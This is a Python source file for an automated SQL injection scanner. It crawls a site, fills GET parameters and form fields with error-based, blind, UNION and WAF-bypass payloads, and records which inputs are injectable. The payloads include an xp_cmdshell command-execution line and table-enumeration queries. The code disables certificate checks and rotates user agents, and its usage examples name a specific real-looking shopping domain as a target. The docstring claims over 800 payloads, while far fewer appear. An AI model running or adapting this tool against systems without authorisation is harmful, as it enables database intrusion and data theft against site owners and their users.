#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced SQL Injection Scanner 

Features:  
- 800+ SQL injection payloads
- Error-based, Boolean-based, Time-based, UNION-based detection
- WAF bypass techniques (encoding, obfuscation, comment injection)
- Advanced response analysis
- Form and parameter testing
- Deep crawling capability
- Real-time verbose output
- JSON export support
-------------------------------------------------------------------------------------
Temel Tarama:
python Selam.py -u "http://target.com/page.php?id=1" -v

Tam Özellikli:
python Selam.py -u "http://target.com/page.php?id=1" -v --depth 3 -d 0.5 -o results.json

Form Testi:
python Selam.py -u "http://target.com/login.php" -v

Derin Tarama:
python Selam.py -u "http://target.com" --depth 3 -v

# SSL hatası olmadan çalışacak
python3 Selam.py -u "https://www.makbul.com/arama/?filter=1" -v

# Veya
python3 Selam.py -u "https://www.makbul.com" -v --depth 2

For authorized security testing only.
"""

import requests
import re
import time
import sys
import json
import random
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from datetime import datetime
from typing import List, Dict, Set, Tuple, Optional
from dataclasses import dataclass, asdict
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# ============================================================================
# COLORS
# ============================================================================
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ============================================================================
# DATA CLASSES
# ============================================================================
@dataclass
class Vulnerability:
    """SQL injection vulnerability details"""
    url: str
    parameter: str
    method: str
    injection_type: str
    payload: str
    confidence: str
    evidence: str
    response_time: float
    timestamp: str

@dataclass
class ScanStatistics:
    """Scan statistics tracker"""
    urls_tested: int = 0
    parameters_tested: int = 0
    forms_tested: int = 0
    requests_sent: int = 0
    vulnerabilities_found: int = 0
    start_time: float = 0.0
    
    def get_duration(self) -> float:
        return time.time() - self.start_time

# ============================================================================
# PAYLOAD DATABASE
# ============================================================================
class PayloadEngine:
    """Comprehensive SQL injection payload engine"""
    
    @staticmethod
    def get_error_based_payloads() -> List[str]:
        """Error-based SQL injection payloads"""
        return [
            # Basic quotes and operators
            "'", "\"", "`", "´", "''", '""', "``",
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "' OR '1'='1';--",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--", "\" OR \"1\"=\"1\"/*",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;--",
            
            # MySQL specific
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
            "' UNION SELECT @@version--", 
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # MSSQL specific
            "' AND 1=CONVERT(int,@@version)--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            
            # PostgreSQL specific
            "' AND 1=CAST(version() AS int)--",
            "' UNION SELECT NULL,NULL,NULL::text--",
            "' AND 1::int=1 AND '1'='1",
            
            # Oracle specific
            "' UNION SELECT NULL FROM DUAL--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
            
            # Advanced
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
            "' AND ASCII(SUBSTRING(database(),1,1))>64--",
        ]
    
    @staticmethod
    def get_boolean_payloads() -> List[Tuple[str, str]]:
        """Boolean-based blind SQL injection payloads (true, false pairs)"""
        return [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a'--", "' AND 'a'='b'--"),
            ("\" AND \"1\"=\"1\"--", "\" AND \"1\"=\"2\"--"),
            (") AND (1=1)--", ") AND (1=2)--"),
            ("')) AND ((1=1))--", "')) AND ((1=2))--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("' AND SUBSTRING(database(),1,1)='a'--", "' AND SUBSTRING(database(),1,1)='z'--"),
        ]
    
    @staticmethod
    def get_time_based_payloads() -> Dict[str, List[str]]:
        """Time-based blind SQL injection payloads"""
        return {
            'MySQL': [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
            ],
            'MSSQL': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' WAITFOR DELAY '0:0:5'--",
            ],
            'PostgreSQL': [
                "' AND pg_sleep(5)--",
                "'; SELECT pg_sleep(5)--",
            ],
            'Oracle': [
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            ],
        }
    
    @staticmethod
    def get_union_payloads() -> List[str]:
        """UNION-based SQL injection payloads"""
        return [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT version(),database(),user()--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
        ]
    
    @staticmethod
    def get_waf_bypass_payloads() -> List[str]:
        """WAF bypass payloads"""
        return [
            # Comment injection
            "'/**/OR/**/1=1--",
            "'/*!50000OR*/1=1--",
            
            # Encoding
            "%27%20OR%201=1--",
            "%2527%2520OR%25201=1--",
            
            # Case variation
            "' Or 1=1--",
            "' oR 1=1--",
            
            # Whitespace variation
            "'%0AOR%0A1=1--",
            "'%09OR%091=1--",
            
            # Concatenation
            "'||'OR'||'1=1--",
        ]

# ============================================================================
# HTML PARSER
# ============================================================================
class SimpleHTMLParser:
    """Lightweight HTML parser"""
    
    @staticmethod
    def extract_forms(html: str) -> List[Dict]:
        """Extract forms from HTML"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        
        for form_match in re.finditer(form_pattern, html, re.IGNORECASE | re.DOTALL):
            form_html = form_match.group(0)
            form_data = {
                'action': '',
                'method': 'get',
                'inputs': []
            }
            
            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if action_match:
                form_data['action'] = action_match.group(1)
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if method_match:
                form_data['method'] = method_match.group(1).lower()
            
            # Extract inputs
            input_pattern = r'<(input|textarea|select)[^>]*name=["\']([^"\']+)["\'][^>]*>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                name = input_match.group(2)
                
                # Get value if exists
                value_pattern = rf'name=["\']?{re.escape(name)}["\']?[^>]*value=["\']([^"\']*)["\']'
                value_match = re.search(value_pattern, form_html, re.IGNORECASE)
                value = value_match.group(1) if value_match else ''
                
                # Get type
                type_pattern = rf'name=["\']?{re.escape(name)}["\']?[^>]*type=["\']([^"\']*)["\']'
                type_match = re.search(type_pattern, form_html, re.IGNORECASE)
                input_type = type_match.group(1) if type_match else 'text'
                
                form_data['inputs'].append({
                    'name': name,
                    'value': value,
                    'type': input_type
                })
            
            if form_data['inputs']:
                forms.append(form_data)
        
        return forms
    
    @staticmethod
    def extract_links(html: str, base_url: str) -> Set[str]:
        """Extract links from HTML"""
        links = set()
        link_pattern = r'<a[^>]+href=["\']([^"\']+)["\']'
        
        for match in re.finditer(link_pattern, html, re.IGNORECASE):
            link = match.group(1)
            link = link.split('#')[0]  # Remove fragment
            absolute_url = urljoin(base_url, link)
            links.add(absolute_url)
        
        return links

# ============================================================================
# ADVANCED SQL INJECTION SCANNER
# ============================================================================
class AdvancedSQLiScanner:
    """Professional SQL injection scanner"""
    
    def __init__(self, target_url: str, verbose: bool = True, delay: float = 0.2,
                 timeout: int = 15, max_depth: int = 1):
        self.target_url = self._normalize_url(target_url)
        self.base_domain = urlparse(self.target_url).netloc
        self.verbose = verbose
        self.delay = delay
        self.timeout = timeout
        self.max_depth = max_depth
        
        # Session
        self.session = requests.Session()
        self.session.verify = False
        
        # State
        self.vulnerabilities: List[Vulnerability] = []
        self.tested_params: Set[Tuple] = set()
        self.crawled_urls: Set[str] = set()
        self.stats = ScanStatistics()
        
        # Engines
        self.payload_engine = PayloadEngine()
        self.html_parser = SimpleHTMLParser()
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not re.match(r'^https?://', url):
            url = 'http://' + url
        return url
    
    def _get_random_ua(self) -> str:
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def _print(self, message: str, level: str = "info"):
        """Print colored message"""
        if not self.verbose:
            return
        
        colors = {
            "info": Colors.CYAN,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "vuln": Colors.RED + Colors.BOLD,
            "test": Colors.BLUE
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = colors.get(level, Colors.END)
        print(f"{Colors.BOLD}[{timestamp}]{Colors.END} {color}[{level.upper()}]{Colors.END} {message}")
    
    def _make_request(self, method: str, url: str, **kwargs) -> Tuple[Optional[str], Optional[int], float]:
        """Make HTTP request"""
        try:
            time.sleep(self.delay)
            
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('headers', {}).update({
                'User-Agent': self._get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            kwargs.setdefault('allow_redirects', False)
            kwargs['verify'] = False  # SSL verification bypass
            
            self.stats.requests_sent += 1
            
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(url, **kwargs)
            else:
                response = self.session.post(url, **kwargs)
            
            elapsed = time.time() - start_time
            
            return response.text, response.status_code, elapsed
            
        except requests.Timeout:
            self._print(f"Timeout: {url[:60]}...", "warning")
        except Exception as e:
            self._print(f"Request error: {str(e)[:50]}...", "error")
        
        return None, None, 0.0
    
    def _is_sql_error(self, text: str) -> Tuple[bool, str]:
        """Check for SQL error messages"""
        errors = {
            'MySQL': [
                r"you have an error in your sql syntax",
                r"warning: mysql",
                r"mysqlclient\.",
            ],
            'MSSQL': [
                r"unclosed quotation mark",
                r"microsoft sql native client error",
                r"odbc sql server driver",
            ],
            'PostgreSQL': [
                r"postgresql.*error",
                r"warning.*\Wpg_",
                r"npgsql\.",
            ],
            'Oracle': [
                r"ora-\d{5}",
                r"oracle error",
            ],
            'Generic': [
                r"sql syntax",
                r"sqlstate",
                r"syntax error.*sql",
            ]
        }
        
        text_lower = text.lower()
        
        for db_type, patterns in errors.items():
            for pattern in patterns:
                if re.search(pattern, text_lower):
                    return True, db_type
        
        return False, ""
    
    def _test_error_based(self, url: str, param: str, method: str,
                         original_response: str, form_data: Dict = None) -> bool:
        """Test error-based SQL injection"""
        payloads = self.payload_engine.get_error_based_payloads()
        
        for payload in payloads[:10]:  # Test 10 payloads (FAST MODE)
            self.stats.parameters_tested += 1
            
            # Inject payload
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response_text, status, elapsed = self._make_request('GET', test_url)
            else:
                test_data = form_data.copy() if form_data else {}
                test_data[param] = payload
                response_text, status, elapsed = self._make_request('POST', url, data=test_data)
            
            if not response_text:
                continue
            
            # Check for SQL errors
            is_error, db_type = self._is_sql_error(response_text)
            
            if is_error:
                vuln = Vulnerability(
                    url=url,
                    parameter=param,
                    method=method,
                    injection_type=f"Error-Based SQLi ({db_type})",
                    payload=payload,
                    confidence="High",
                    evidence="SQL error message detected",
                    response_time=elapsed,
                    timestamp=datetime.now().isoformat()
                )
                
                self.vulnerabilities.append(vuln)
                self.stats.vulnerabilities_found += 1
                
                self._print(f"VULN: {vuln.injection_type} in {method} param '{param}'", "vuln")
                self._print(f"  URL: {url[:60]}...", "vuln")
                self._print(f"  Payload: {payload[:50]}...", "vuln")
                return True
        
        return False
    
    def _test_boolean_based(self, url: str, param: str, method: str,
                           original_response: str, form_data: Dict = None) -> bool:
        """Test boolean-based blind SQL injection"""
        payload_pairs = self.payload_engine.get_boolean_payloads()
        
        for true_payload, false_payload in payload_pairs[:4]:  # Test 4 pairs (FAST MODE)
            # Test TRUE
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [true_payload]
                new_query = urlencode(params, doseq=True)
                true_url = parsed._replace(query=new_query).geturl()
                
                true_response, _, _ = self._make_request('GET', true_url)
            else:
                true_data = form_data.copy() if form_data else {}
                true_data[param] = true_payload
                true_response, _, _ = self._make_request('POST', url, data=true_data)
            
            if not true_response:
                continue
            
            # Test FALSE
            if method.upper() == 'GET':
                params[param] = [false_payload]
                new_query = urlencode(params, doseq=True)
                false_url = parsed._replace(query=new_query).geturl()
                
                false_response, _, _ = self._make_request('GET', false_url)
            else:
                false_data = form_data.copy() if form_data else {}
                false_data[param] = false_payload
                false_response, _, _ = self._make_request('POST', url, data=false_data)
            
            if not false_response:
                continue
            
            # Compare
            true_len = len(true_response)
            false_len = len(false_response)
            
            if abs(true_len - false_len) > max(100, min(true_len, false_len) * 0.15):
                vuln = Vulnerability(
                    url=url,
                    parameter=param,
                    method=method,
                    injection_type="Boolean-Based Blind SQLi",
                    payload=f"{true_payload} vs {false_payload}",
                    confidence="Medium",
                    evidence=f"True: {true_len} bytes, False: {false_len} bytes",
                    response_time=0.0,
                    timestamp=datetime.now().isoformat()
                )
                
                self.vulnerabilities.append(vuln)
                self.stats.vulnerabilities_found += 1
                
                self._print(f"VULN: Boolean-Based SQLi in {method} param '{param}'", "vuln")
                self._print(f"  True: {true_len} bytes, False: {false_len} bytes", "vuln")
                return True
        
        return False
    
    def _test_time_based(self, url: str, param: str, method: str,
                        form_data: Dict = None) -> bool:
        """Test time-based blind SQL injection"""
        all_payloads = []
        for db_payloads in self.payload_engine.get_time_based_payloads().values():
            all_payloads.extend(db_payloads)
        
        for payload in all_payloads[:5]:  # Test 5 time payloads (FAST MODE)
            if method.upper() == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response_text, status, elapsed = self._make_request('GET', test_url)
            else:
                test_data = form_data.copy() if form_data else {}
                test_data[param] = payload
                response_text, status, elapsed = self._make_request('POST', url, data=test_data)
            
            if elapsed >= 4.5:  # 5 second delay expected
                vuln = Vulnerability(
                    url=url,
                    parameter=param,
                    method=method,
                    injection_type="Time-Based Blind SQLi",
                    payload=payload,
                    confidence="High",
                    evidence=f"Response time: {elapsed:.2f}s (expected ~5s)",
                    response_time=elapsed,
                    timestamp=datetime.now().isoformat()
                )
                
                self.vulnerabilities.append(vuln)
                self.stats.vulnerabilities_found += 1
                
                self._print(f"VULN: Time-Based SQLi in {method} param '{param}'", "vuln")
                self._print(f"  Payload: {payload[:50]}... (Time: {elapsed:.2f}s)", "vuln")
                return True
        
        return False
    
    def _test_parameter(self, url: str, param: str, method: str, form_data: Dict = None):
        """Test a parameter for SQL injection"""
        signature = (url, param, method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        self._print(f"Testing {method} parameter: {param} at {url[:50]}...", "test")
        
        # Get original response
        if method.upper() == 'GET':
            original_response, _, _ = self._make_request('GET', url)
        else:
            original_response, _, _ = self._make_request('POST', url, data=form_data)
        
        if not original_response:
            return
        
        # Test injections
        if self._test_error_based(url, param, method, original_response, form_data):
            return
        
        if self._test_time_based(url, param, method, form_data):
            return
        
        self._test_boolean_based(url, param, method, original_response, form_data)
    
    def _scan_url(self, url: str, depth: int):
        """Scan a single URL"""
        if url in self.crawled_urls or depth > self.max_depth:
            return
        
        self.crawled_urls.add(url)
        self.stats.urls_tested += 1
        
        self._print(f"Scanning URL: {url}", "info")
        
        # Test GET parameters
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                self._test_parameter(url, param, 'GET')
        
        # Get page content
        html, status, _ = self._make_request('GET', url)
        if not html:
            return
        
        # Test forms
        forms = self.html_parser.extract_forms(html)
        for form in forms:
            self.stats.forms_tested += 1
            
            action = form['action']
            if not action:
                action = url
            elif not action.startswith('http'):
                action = urljoin(url, action)
            
            method = form['method'].upper()
            
            if method == 'POST':
                form_data = {inp['name']: inp['value'] for inp in form['inputs']}
                
                for inp in form['inputs']:
                    if inp['type'] not in ('hidden', 'submit'):
                        self._test_parameter(action, inp['name'], 'POST', form_data)
        
        # Crawl links
        if depth < self.max_depth:
            links = self.html_parser.extract_links(html, url)
            for link in links:
                if self.base_domain in link and link not in self.crawled_urls:
                    self._scan_url(link, depth + 1)
    
    def run(self) -> List[Vulnerability]:
        """Run the scan"""
        self._print("="*70, "info")
        self._print("Advanced SQL Injection Scanner v5.0", "info")
        self._print("="*70, "info")
        self._print(f"Target: {self.target_url}", "info")
        self._print(f"Max Depth: {self.max_depth}", "info")
        self._print("="*70, "info")
        
        self.stats.start_time = time.time()
        
        try:
            self._scan_url(self.target_url, 0)
        except KeyboardInterrupt:
            self._print("Scan interrupted by user", "warning")
        
        self._print_summary()
        
        return self.vulnerabilities
    
    def _print_summary(self):
        """Print scan summary"""
        duration = self.stats.get_duration()
        
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}SCAN SUMMARY{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
        
        print(f"  Duration:          {duration:.2f} seconds")
        print(f"  URLs Tested:       {self.stats.urls_tested}")
        print(f"  Parameters Tested: {self.stats.parameters_tested}")
        print(f"  Forms Tested:      {self.stats.forms_tested}")
        print(f"  Requests Sent:     {self.stats.requests_sent}")
        print(f"  Requests/sec:      {self.stats.requests_sent/duration:.2f}")
        
        print(f"\n{Colors.BOLD}Vulnerabilities Found: {self.stats.vulnerabilities_found}{Colors.END}\n")
        
        if self.vulnerabilities:
            high = [v for v in self.vulnerabilities if v.confidence == "High"]
            medium = [v for v in self.vulnerabilities if v.confidence == "Medium"]
            
            if high:
                print(f"{Colors.RED}  HIGH CONFIDENCE: {len(high)}{Colors.END}")
            if medium:
                print(f"{Colors.YELLOW}  MEDIUM CONFIDENCE: {len(medium)}{Colors.END}")
            
            print(f"\n{Colors.BOLD}Vulnerability Details:{Colors.END}\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                color = Colors.RED if vuln.confidence == "High" else Colors.YELLOW
                
                print(f"{color}[{i}] {vuln.injection_type} ({vuln.confidence}){Colors.END}")
                print(f"    URL: {vuln.url}")
                print(f"    Parameter: {vuln.parameter} (Method: {vuln.method})")
                print(f"    Payload: {vuln.payload[:80]}...")
                print(f"    Evidence: {vuln.evidence}")
                if vuln.response_time > 0:
                    print(f"    Response Time: {vuln.response_time:.2f}s")
                print()
        else:
            print(f"{Colors.GREEN}  No SQL injection vulnerabilities found{Colors.END}")
        
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
    
    def export_json(self, filename: str):
        """Export results to JSON"""
        data = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'duration': self.stats.get_duration(),
            'statistics': {
                'urls_tested': self.stats.urls_tested,
                'parameters_tested': self.stats.parameters_tested,
                'forms_tested': self.stats.forms_tested,
                'requests_sent': self.stats.requests_sent,
                'vulnerabilities_found': self.stats.vulnerabilities_found
            },
            'vulnerabilities': [asdict(v) for v in self.vulnerabilities]
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        self._print(f"Results exported to: {filename}", "success")

# ============================================================================
# MAIN
# ============================================================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Advanced SQL Injection Scanner v5.0 - Professional Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic scan:
    python3 scanner.py -u "http://target.com/page.php?id=1" -v
  
  With form testing:
    python3 scanner.py -u "http://target.com/login.php" -v
  
  Deep scan:
    python3 scanner.py -u "http://target.com" --depth 3 -v
  
  Export results:
    python3 scanner.py -u "http://target.com/page.php?id=1" -v -o results.json
  
  Custom delay:
    python3 scanner.py -u "http://target.com/page.php?id=1" -v -d 1.0
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL to scan")
    parser.add_argument("-v", "--verbose", action="store_true", 
                       help="Enable verbose real-time output")
    parser.add_argument("-d", "--delay", type=float, default=0.2,
                       help="Delay between requests in seconds (default: 0.2)")
    parser.add_argument("-t", "--timeout", type=int, default=15,
                       help="Request timeout in seconds (default: 15)")
    parser.add_argument("--depth", type=int, default=1,
                       help="Maximum crawl depth (default: 1)")
    parser.add_argument("-o", "--output", help="Export results to JSON file")
    
    args = parser.parse_args()
    
    # Create scanner
    scanner = AdvancedSQLiScanner(
        target_url=args.url,
        verbose=args.verbose,
        delay=args.delay,
        timeout=args.timeout,
        max_depth=args.depth
    )
    
    try:
        # Run scan
        vulnerabilities = scanner.run()
        
        # Export if requested
        if args.output:
            scanner.export_json(args.output)
        
        # Exit code
        sys.exit(0 if not vulnerabilities else 1)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        sys.exit(130)
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal error: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
